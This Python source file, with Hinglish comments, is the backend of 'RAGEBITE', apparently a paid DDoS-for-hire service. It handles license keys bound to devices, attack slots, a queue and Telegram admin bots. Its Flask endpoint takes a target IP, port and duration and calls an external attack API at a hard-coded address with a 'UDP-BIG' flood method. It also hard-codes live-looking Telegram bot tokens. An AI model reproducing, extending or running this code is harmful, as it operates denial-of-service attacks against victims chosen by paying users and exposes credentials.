"""
⚡ RAGEBITE ALL-IN-ONE BACKEND ⚡
Device ID based — koi manual user_id nahi
"""

import os
import sqlite3
import random
import string
import threading
import time
import asyncio
from datetime import datetime, timedelta

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests


# ============================================================
# ⚙️ CONFIGURATION
# ============================================================
VERIFY_BOT_TOKEN = "8823908635:AAHtShV7f7nuYA2Y2BjeqYK5cqYD9TFAT3s"
DD_BOT_TOKEN = "8650600804:AAEjG0LscwdMjClRuMS8fI7nAmShqPyaato"
OWNER_ID = 6321758394
API_SECRET = "RAGEBITE_SECRET_2026_CHANGE_ME"
API_PORT = 5000
MAX_SLOTS = 4

ATTACK_API_URL = "http://176.100.37.127:3001/api/v1/attack/start"
DEFAULT_METHOD = "UDP-BIG"

STATUS_ACTIVE = "ACTIVE"
STATUS_EXPIRED = "EXPIRED"
STATUS_DELETED = "DELETED"
STATUS_DISABLED = "DISABLED"

DB_NAME = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ragebite.db')


# ============================================================
# 📦 DATABASE
# ============================================================
def get_conn():
    return sqlite3.connect(DB_NAME, check_same_thread=False)


def init_db():
    conn = get_conn()
    c = conn.cursor()

    # 🆕 user_id ab TEXT (Device ID) hoga
    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        key TEXT PRIMARY KEY,
        device_id TEXT,
        expiry TEXT,
        status TEXT DEFAULT 'ACTIVE',
        created_at TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS slots (
        slot_id INTEGER PRIMARY KEY,
        device_id TEXT,
        key TEXT,
        package_name TEXT,
        ip TEXT,
        port TEXT,
        time_sec INTEGER,
        start_time TEXT,
        end_time TEXT,
        is_active INTEGER DEFAULT 0
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS queue (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT UNIQUE,
        key TEXT,
        package_name TEXT,
        ip TEXT,
        port TEXT,
        time_sec INTEGER,
        joined_at TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS servers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        ip TEXT,
        port TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS api_keys (
        name TEXT PRIMARY KEY,
        api_key TEXT NOT NULL,
        added_at TEXT,
        is_active INTEGER DEFAULT 1
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')

    c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)',
              ('maintenance', 'off'))

    for i in range(1, MAX_SLOTS + 1):
        c.execute('INSERT OR IGNORE INTO slots (slot_id, is_active) VALUES (?, 0)', (i,))

    conn.commit()
    conn.close()
    print(f"✅ Database ready: {DB_NAME}")


# ==================== MAINTENANCE ====================
def is_maintenance_on():
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key='maintenance'")
    row = c.fetchone()
    conn.close()
    return row and row[0] == "on"


def set_maintenance(state):
    conn = get_conn()
    c = conn.cursor()
    c.execute("UPDATE settings SET value=? WHERE key='maintenance'",
              ("on" if state else "off",))
    conn.commit()
    conn.close()


# ==================== KEY GENERATION (NO DEVICE ID) ====================
def generate_key(days):
    """
    🆕 Sirf days do — koi device_id nahi
    Device ID login ke waqt auto-bind hogi
    """
    key = "LTN-1M-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    conn = get_conn()
    c = conn.cursor()
    c.execute('''INSERT INTO keys (key, device_id, expiry, status, created_at)
                 VALUES (?, NULL, ?, ?, ?)''',
              (key, expiry, STATUS_ACTIVE,
               datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()
    return key, expiry


# ==================== KEY VERIFICATION ====================
def verify_key(key):
    if is_maintenance_on():
        return None, "MAINTENANCE"
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT expiry, status FROM keys WHERE key = ?', (key,))
    row = c.fetchone()
    conn.close()
    if not row:
        return None, "NOT_FOUND"
    expiry_str, status = row
    if status == STATUS_DELETED:
        return None, "DELETED"
    if status == STATUS_DISABLED:
        return None, "DISABLED"
    expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    if expiry < datetime.now():
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_EXPIRED, key))
        conn.commit()
        conn.close()
        return None, "EXPIRED"
    return int(expiry.timestamp() * 1000), "VALID"


def verify_key_with_device(key, device_id):
    """
    🆕 Key verify + device binding
    Returns: (expiry, status, device_match)
    """
    if is_maintenance_on():
        return None, "MAINTENANCE", False
    
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT expiry, status, device_id FROM keys WHERE key = ?', (key,))
    row = c.fetchone()
    
    if not row:
        conn.close()
        return None, "NOT_FOUND", False
    
    expiry_str, status, existing_device = row
    
    if status == STATUS_DELETED:
        conn.close()
        return None, "DELETED", False
    if status == STATUS_DISABLED:
        conn.close()
        return None, "DISABLED", False
    
    expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    if expiry < datetime.now():
        c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_EXPIRED, key))
        conn.commit()
        conn.close()
        return None, "EXPIRED", False
    
    # 🆕 Device binding logic
    if existing_device is None:
        # Pehli baar — device bind karo
        c.execute('UPDATE keys SET device_id = ? WHERE key = ?', (device_id, key))
        conn.commit()
        conn.close()
        print(f"🔗 Device bound: {key[:15]}... → {device_id}")
        return int(expiry.timestamp() * 1000), "VALID", True
    elif existing_device == device_id:
        # Same device — ok
        conn.close()
        return int(expiry.timestamp() * 1000), "VALID", True
    else:
        # ❌ Different device
        conn.close()
        return None, "DEVICE_MISMATCH", False


def is_device_authorized(device_id):
    """Device authorized hai ya nahi"""
    conn = get_conn()
    c = conn.cursor()
    c.execute('''SELECT key, expiry, status FROM keys 
                 WHERE device_id = ? 
                 ORDER BY created_at DESC LIMIT 1''', (device_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return False, None, "NO_KEY"
    
    key, expiry_str, status = row
    
    if status == STATUS_DELETED:
        return False, key, "DELETED"
    if status == STATUS_DISABLED:
        return False, key, "DISABLED"
    
    expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    if expiry < datetime.now():
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_EXPIRED, key))
        conn.commit()
        conn.close()
        return False, key, "EXPIRED"
    
    return True, key, "VALID"


# ==================== KEY MANAGEMENT ====================
def delete_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_DELETED, key))
    conn.commit()
    conn.close()


def disable_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_DISABLED, key))
    conn.commit()
    conn.close()


def enable_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_ACTIVE, key))
    conn.commit()
    conn.close()


def reset_device_binding(key):
    """🆕 Device binding reset karein (owner ke liye)"""
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET device_id = NULL WHERE key = ?', (key,))
    conn.commit()
    conn.close()


def get_all_active_devices():
    """Sab active devices"""
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT DISTINCT device_id FROM keys WHERE status='ACTIVE' AND device_id IS NOT NULL")
    rows = c.fetchall()
    conn.close()
    return [r[0] for r in rows]


# ==================== SLOTS ====================
def get_free_slot():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT slot_id FROM slots WHERE is_active=0 ORDER BY slot_id ASC LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


def allot_slot(device_id, key, package_name, ip, port, time_sec):
    slot_id = get_free_slot()
    if slot_id is None:
        return None
    start = datetime.now()
    end = start + timedelta(seconds=time_sec)
    conn = get_conn()
    c = conn.cursor()
    c.execute('''UPDATE slots SET device_id=?, key=?, package_name=?, ip=?, port=?, time_sec=?,
                 start_time=?, end_time=?, is_active=1 WHERE slot_id=?''',
              (device_id, key, package_name, ip, port, time_sec,
               start.strftime('%Y-%m-%d %H:%M:%S'),
               end.strftime('%Y-%m-%d %H:%M:%S'),
               slot_id))
    conn.commit()
    conn.close()
    return slot_id


def release_slot(slot_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('''UPDATE slots SET device_id=NULL, key=NULL, package_name=NULL,
                 ip=NULL, port=NULL, time_sec=NULL, start_time=NULL,
                 end_time=NULL, is_active=0 WHERE slot_id=?''', (slot_id,))
    conn.commit()
    conn.close()


def get_all_slots():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT * FROM slots ORDER BY slot_id')
    rows = c.fetchall()
    conn.close()
    return rows


def get_expired_slots():
    conn = get_conn()
    c = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute('SELECT slot_id, device_id FROM slots WHERE is_active=1 AND end_time <= ?', (now,))
    rows = c.fetchall()
    conn.close()
    return rows


def device_has_active_slot(device_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT slot_id FROM slots WHERE device_id=? AND is_active=1', (device_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


# ==================== QUEUE ====================
def add_to_queue(device_id, key, package_name, ip, port, time_sec):
    conn = get_conn()
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO queue 
                 (device_id, key, package_name, ip, port, time_sec, joined_at)
                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
              (device_id, key, package_name, ip, port, time_sec,
               datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()


def get_queue_position(device_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT id FROM queue WHERE device_id=?', (device_id,))
    row = c.fetchone()
    if not row:
        conn.close()
        return None
    c.execute('SELECT COUNT(*) FROM queue WHERE id <= ?', (row[0],))
    pos = c.fetchone()[0]
    conn.close()
    return pos


def pop_next_from_queue():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT * FROM queue ORDER BY id ASC LIMIT 1')
    row = c.fetchone()
    if row:
        c.execute('DELETE FROM queue WHERE id=?', (row[0],))
        conn.commit()
    conn.close()
    return row


def get_queue_count():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM queue')
    count = c.fetchone()[0]
    conn.close()
    return count


# ==================== SERVERS ====================
def add_server(name, ip, port):
    conn = get_conn()
    c = conn.cursor()
    c.execute('INSERT INTO servers (name, ip, port) VALUES (?, ?, ?)', (name, ip, port))
    conn.commit()
    conn.close()


def get_random_server():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT ip, port FROM servers ORDER BY RANDOM() LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row


def get_all_servers():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT name, ip, port FROM servers')
    rows = c.fetchall()
    conn.close()
    return rows


# ==================== API KEYS ====================
def add_api_key(name, api_key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO api_keys (name, api_key, added_at, is_active) VALUES (?, ?, ?, 1)',
              (name, api_key, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()


def delete_api_key(name):
    conn = get_conn()
    c = conn.cursor()
    c.execute('DELETE FROM api_keys WHERE name = ?', (name,))
    conn.commit()
    conn.close()


def get_all_api_keys():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT name, api_key, added_at FROM api_keys ORDER BY added_at DESC')
    rows = c.fetchall()
    conn.close()
    return rows


def get_active_api_key():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT api_key FROM api_keys WHERE is_active = 1 ORDER BY added_at DESC LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


# ==================== EXTERNAL ATTACK API ====================
def call_external_attack_api(ip, port, time_sec, method=None):
    if method is None:
        method = DEFAULT_METHOD
    api_key = get_active_api_key()
    if not api_key:
        return False, "No API key configured!"

    params = {"key": api_key, "ip": ip, "port": port, "time": time_sec, "method": method}
    try:
        print(f"🎯 Attack API: {ip}:{port} for {time_sec}s")
        response = requests.get(ATTACK_API_URL, params=params, timeout=15)
        print(f"📡 Response: {response.status_code}")
        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, dict):
                    status = data.get("status", "unknown")
                    if status in ["success", "started", "ok", "attacking"]:
                        return True, f"Started: {data.get('message', 'Success')}"
                    return False, f"API said: {status}"
                return True, "Attack started"
            except:
                return True, response.text[:100]
        return False, f"HTTP {response.status_code}"
    except requests.exceptions.Timeout:
        return False, "API Timeout"
    except requests.exceptions.ConnectionError:
        return False, "Connection Error"
    except Exception as e:
        return False, f"Error: {str(e)}"


# ============================================================
# 🛡️ VERIFY BOT
# ============================================================
async def v_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    is_owner = update.effective_user.id == OWNER_ID
    msg = ("🛡️ *RAGEBITE VERIFY BOT* 🛡️\n\n"
           "`/verify <key>` — Verify key\n"
           "`/mykey <key>` — Key info\n")
    if is_owner:
        msg += ("\n👑 *Owner:*\n"
                "`/genkey <days>` — Key generate\n"
                "`/delkey <key>` | `/diskey <key>` | `/enkey <key>`\n"
                "`/resetbind <key>` — Reset device binding\n"
                "`/listkeys` | `/maintenance on|off` | `/slotson`")
    await update.message.reply_text(msg, parse_mode='Markdown')


async def v_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ye telegram me direct verify hai (device binding ke bina)"""
    if not context.args:
        await update.message.reply_text("INVALID|NoKey")
        return
    key = context.args[0].upper().strip()
    expiry, status = verify_key(key)
    if status == "VALID":
        await update.message.reply_text(f"VALID|{expiry}")
    else:
        await update.message.reply_text(f"INVALID|{status}")


async def v_mykey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: `/mykey <key>`", parse_mode='Markdown')
        return
    key = context.args[0].upper().strip()
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT key, device_id, expiry, status FROM keys WHERE key = ?', (key,))
    row = c.fetchone()
    conn.close()
    if not row:
        await update.message.reply_text("❌ Key not found")
        return
    device_display = row[1] if row[1] else "❌ Not bound yet"
    await update.message.reply_text(
        f"🔑 *Key Info*\n\n"
        f"Key: `{row[0]}`\n"
        f"Device: `{device_display}`\n"
        f"Expiry: {row[2]}\n"
        f"Status: `{row[3]}`",
        parse_mode='Markdown')


async def v_genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🆕 Sirf days maango — koi device ID nahi"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only Owner!")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "❌ *Usage:* `/genkey <days>`\n\n"
            "*Example:*\n"
            "`/genkey 30` — 30 din ki key\n"
            "`/genkey 7` — 7 din ki key",
            parse_mode='Markdown'
        )
        return
    
    try:
        days = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid days")
        return
    
    if days < 1 or days > 3650:
        await update.message.reply_text("❌ Days 1-3650")
        return
    
    key, expiry = generate_key(days)
    
    await update.message.reply_text(
        f"✅ *Key Generated*\n\n"
        f"🔑 Key: `{key}`\n"
        f"📅 Valid till: {expiry}\n"
        f"⏱️ Duration: {days} days\n\n"
        f"📱 Ye key user ko dein.\n"
        f"User APK me daalega → Device auto-bind hoga.",
        parse_mode='Markdown'
    )


async def v_delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    delete_key(context.args[0].upper())
    await update.message.reply_text(f"🗑️ Deleted", parse_mode='Markdown')


async def v_diskey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    disable_key(context.args[0].upper())
    await update.message.reply_text(f"⛔ Disabled", parse_mode='Markdown')


async def v_enkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    enable_key(context.args[0].upper())
    await update.message.reply_text(f"✅ Enabled", parse_mode='Markdown')


async def v_resetbind(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🆕 Device binding reset karein (user ne phone change kiya ho to)"""
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    key = context.args[0].upper()
    reset_device_binding(key)
    await update.message.reply_text(
        f"🔄 *Device Binding Reset*\n\n"
        f"Key: `{key}`\n"
        f"Ab ye key kisi bhi device pe kaam karegi (pehli baar).",
        parse_mode='Markdown'
    )


async def v_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if not context.args:
        status = "🔧 ON" if is_maintenance_on() else "✅ OFF"
        await update.message.reply_text(f"*Maintenance:* {status}", parse_mode='Markdown')
        return
    action = context.args[0].lower()
    if action == "on":
        set_maintenance(True)
        await update.message.reply_text("🔧 *MAINTENANCE ON*")
    elif action == "off":
        set_maintenance(False)
        await update.message.reply_text("✅ *MAINTENANCE OFF*")


async def v_listkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT key, device_id, status FROM keys ORDER BY created_at DESC LIMIT 20')
    rows = c.fetchall()
    conn.close()
    msg = "📋 *Keys:*\n\n"
    for k in rows:
        dev = (k[1][:12] + "..." if k[1] else "Not bound")
        msg += f"`{k[0]}` — {dev} | {k[2]}\n"
    await update.message.reply_text(msg or "❌ None", parse_mode='Markdown')


async def v_slotson(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    slots = get_all_slots()
    msg = "📊 *LIVE SLOTS*\n\n"
    for s in slots:
        if s[9]:
            rem = (datetime.strptime(s[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
            dev = (s[1][:12] + "..." if s[1] else "?")
            msg += f"🔴 Slot #{s[0]} — {dev} | {s[4]}:{s[5]} | {rem}s\n"
        else:
            msg += f"🟢 Slot #{s[0]} FREE\n"
    msg += f"\n📋 Queue: {get_queue_count()}"
    await update.message.reply_text(msg, parse_mode='Markdown')


# ============================================================
# ⚔️ DD BOT
# ============================================================
async def d_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_owner = user_id == OWNER_ID
    
    if is_owner:
        msg = ("⚔️ *RAGEBITE DD BOT* ⚔️\n\n"
               "👑 *Owner Commands:*\n"
               "`/addapikey <name> <key>`\n"
               "`/delapikey <name>` | `/listapikeys`\n"
               "`/addserver <name> <ip> <port>` | `/listservers`\n"
               "`/slots`")
        await update.message.reply_text(msg, parse_mode='Markdown')
        return
    
    await update.message.reply_text(
        "🚫 Ye bot sirf owner ke liye hai.\n\n"
        "Aap APK use karein.",
        parse_mode='Markdown'
    )


async def d_slots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    slots = get_all_slots()
    msg = "📊 *SLOTS*\n\n"
    for s in slots:
        if s[9] == 1:
            rem = (datetime.strptime(s[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
            msg += f"🔴 Slot #{s[0]}: {rem}s\n"
        else:
            msg += f"🟢 Slot #{s[0]}: FREE\n"
    msg += f"\n📋 Queue: {get_queue_count()}"
    await update.message.reply_text(msg, parse_mode='Markdown')


async def d_addapikey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or len(context.args) < 2:
        return
    name = context.args[0].lower()
    api_key = context.args[1]
    add_api_key(name, api_key)
    await update.message.reply_text(f"✅ Added `{name}`", parse_mode='Markdown')


async def d_delapikey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    delete_api_key(context.args[0].lower())
    await update.message.reply_text(f"🗑️ Deleted", parse_mode='Markdown')


async def d_listapikeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    rows = get_all_api_keys()
    if not rows:
        await update.message.reply_text("📭 None")
        return
    msg = f"🔑 *API Keys ({len(rows)})*\n\n"
    for i, r in enumerate(rows, 1):
        msg += f"*{i}. {r[0]}*\n`{r[1][:20]}...{r[1][-8:]}`\n\n"
    await update.message.reply_text(msg, parse_mode='Markdown')


async def d_addserver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or len(context.args) != 3:
        return
    add_server(*context.args)
    await update.message.reply_text(f"✅ Server: {context.args[0]}")


async def d_listservers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    rows = get_all_servers()
    if not rows:
        await update.message.reply_text("❌ None")
        return
    msg = "🌐 *Servers:*\n\n"
    for i, r in enumerate(rows, 1):
        msg += f"{i}. {r[0]}: `{r[1]}:{r[2]}`\n"
    await update.message.reply_text(msg, parse_mode='Markdown')


# ============================================================
# 🔄 AUTO-RELEASE
# ============================================================
async def auto_release_loop(application):
    while True:
        try:
            for slot_id, device_id in get_expired_slots():
                release_slot(slot_id)
                nxt = pop_next_from_queue()
                if nxt:
                    _, did, k, pkg, ip, port, t, _ = nxt
                    authorized, kk, _ = is_device_authorized(did)
                    if not authorized:
                        continue
                    new_slot = allot_slot(did, kk, pkg, ip, port, t)
                    if new_slot:
                        call_external_attack_api(ip, port, t)
                        print(f"✅ Queue auto-attack: Slot #{new_slot} | {did}")
        except Exception as e:
            print(f"Auto-release: {e}")
        await asyncio.sleep(5)


async def post_init(application):
    asyncio.create_task(auto_release_loop(application))


# ============================================================
# 🌐 FLASK API
# ============================================================
flask_app = Flask(__name__)
CORS(flask_app)


def check_auth():
    return request.headers.get('X-API-KEY') == API_SECRET


def notify_owner_dd(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{DD_BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_ID, "text": text, "parse_mode": "Markdown"},
            timeout=5)
    except:
        pass


@flask_app.route('/api/verify', methods=['POST'])
def api_verify():
    """🎯 Device ID binding ke saath verify"""
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json or {}
    key = data.get('key', '').upper().strip()
    device_id = data.get('device_id', '').strip()
    
    if not device_id:
        return jsonify({"status": "INVALID", "reason": "NoDeviceID"})
    
    expiry, status, _ = verify_key_with_device(key, device_id)
    
    if status == "VALID":
        return jsonify({"status": "VALID", "expiry": expiry})
    return jsonify({"status": "INVALID", "reason": status})


@flask_app.route('/api/slots', methods=['GET'])
def api_slots():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    rows = get_all_slots()
    slots = []
    for r in rows:
        if r[9]:
            rem = (datetime.strptime(r[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
            slots.append({"slot": r[0], "status": "BUSY", "remaining": rem})
        else:
            slots.append({"slot": r[0], "status": "FREE", "remaining": 0})
    return jsonify({"slots": slots, "queue_count": get_queue_count(), "max_slots": MAX_SLOTS})


@flask_app.route('/api/dd', methods=['POST'])
def api_dd():
    """🎯 APK se attack request"""
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json or {}
    device_id = data.get('device_id', '').strip()
    key = data.get('key', '').upper().strip()
    ip = data.get('ip')
    port = data.get('port')
    time_sec = int(data.get('time', 60))
    pkg = data.get('package', 'unknown')
    
    if not all([device_id, key, ip, port]):
        return jsonify({"status": "ERROR", "reason": "MissingFields"})
    
    if time_sec < 10 or time_sec > 300:
        return jsonify({"status": "ERROR", "reason": "InvalidTime"})
    
    if is_maintenance_on():
        return jsonify({"status": "ERROR", "reason": "MAINTENANCE"})
    
    # Device verify
    authorized, user_key, reason = is_device_authorized(device_id)
    if not authorized:
        return jsonify({"status": "ERROR", "reason": reason})
    
    # Already active slot
    existing = device_has_active_slot(device_id)
    if existing:
        return jsonify({"status": "ERROR", "reason": "AlreadyActive", "slot": existing})
    
    # Slot allot
    slot_id = allot_slot(device_id, key, pkg, ip, port, time_sec)
    
    if slot_id is None:
        add_to_queue(device_id, key, pkg, ip, port, time_sec)
        slots = get_all_slots()
        slots_info = ""
        for s in slots:
            if s[9]:
                rem = (datetime.strptime(s[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
                slots_info += f"🔴 Slot #{s[0]}: {rem}s left\n"
            else:
                slots_info += f"🟢 Slot #{s[0]}: FREE\n"
        return jsonify({
            "status": "SLOTS_FULL",
            "queue_position": get_queue_position(device_id),
            "queue_total": get_queue_count(),
            "slots_info": slots_info
        })
    
    # Attack API call
    success, message = call_external_attack_api(ip, port, time_sec)
    if not success:
        release_slot(slot_id)
        return jsonify({"status": "ERROR", "reason": "AttackFailed", "message": message})
    
    notify_owner_dd(f"⚔️ Slot #{slot_id} | Device `{device_id[:12]}...` | {ip}:{port}")
    
    end = datetime.now() + timedelta(seconds=time_sec)
    return jsonify({
        "status": "SLOT_ALLOTTED",
        "slot": slot_id,
        "ip": ip,
        "port": port,
        "time": time_sec,
        "end_time": end.strftime('%H:%M:%S')
    })


@flask_app.route('/api/health', methods=['GET'])
def api_health():
    return jsonify({"status": "OK"})


def run_flask():
    flask_app.run(host='0.0.0.0', port=API_PORT, debug=False, use_reloader=False)


# ============================================================
# 🚀 MAIN
# ============================================================
def main():
    init_db()
    
    print("=" * 60)
    print("🛡️ RAGEBITE VERIFY BOT + API")
    print("=" * 60)
    
    threading.Thread(target=run_flask, daemon=True).start()
    print(f"🌐 Flask API on port {API_PORT}")
    time.sleep(1)
    
    v_app = Application.builder().token(VERIFY_BOT_TOKEN).post_init(post_init).build()
    v_app.add_handler(CommandHandler("start", v_start))
    v_app.add_handler(CommandHandler("verify", v_verify))
    v_app.add_handler(CommandHandler("mykey", v_mykey))
    v_app.add_handler(CommandHandler("genkey", v_genkey))
    v_app.add_handler(CommandHandler("delkey", v_delkey))
    v_app.add_handler(CommandHandler("diskey", v_diskey))
    v_app.add_handler(CommandHandler("enkey", v_enkey))
    v_app.add_handler(CommandHandler("resetbind", v_resetbind))
    v_app.add_handler(CommandHandler("maintenance", v_maintenance))
    v_app.add_handler(CommandHandler("listkeys", v_listkeys))
    v_app.add_handler(CommandHandler("slotson", v_slotson))
    
    print("🛡️ Verify Bot running...")
    print("=" * 60)
    print("⚠️  DD Bot ke liye alag terminal me `dd_bot.py` chalayein")
    print("=" * 60)
    
    v_app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()